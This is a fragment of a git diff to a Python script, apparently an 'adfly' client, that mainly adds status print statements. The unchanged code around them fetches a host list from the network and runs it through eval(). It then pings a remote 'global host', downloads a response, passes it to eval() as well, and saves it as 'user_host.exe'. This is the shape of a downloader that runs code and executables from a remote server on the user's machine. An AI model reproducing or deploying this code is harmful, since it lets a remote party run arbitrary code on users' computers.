@@ -21,7 +21,7 @@ if not path.exists(adfly_data_location):
     mkdir(adfly_data_location+'/updates')
     with open(f'{adfly_data_location}/DO NOT MODIFY!!.txt', 'w') as file:
         file.write("Do not modify any file in this directory. It can cause conflicts and/or security bugs")
-
+    print('Directories made!')
 
 def verify_global_host_site():
     global global_host_page
@@ -29,14 +29,15 @@ def verify_global_host_site():
     link_dict = eval(text)
     global_host_page = choice(link_dict['adfly_host_page_list'])
 
-verify_global_host_site()
-
 while get(f"{global_host_page}/ping").text != 'ping':
+    print("Global host ping failed. Retrying...")
     verify_global_host_site()
 while True:
     try:
+        print("Waiting for resources from global host.")
         response = get(f"{global_host_page}/py_files?file_code=8").content
         if response[0] == 123 and response[-1] == 125:
+            print("Data received.")
             response = eval(response)
             if response['file_code'] == '8':
                 with open(f'{adfly_data_location}/user_host.exe', 'wb') as file:
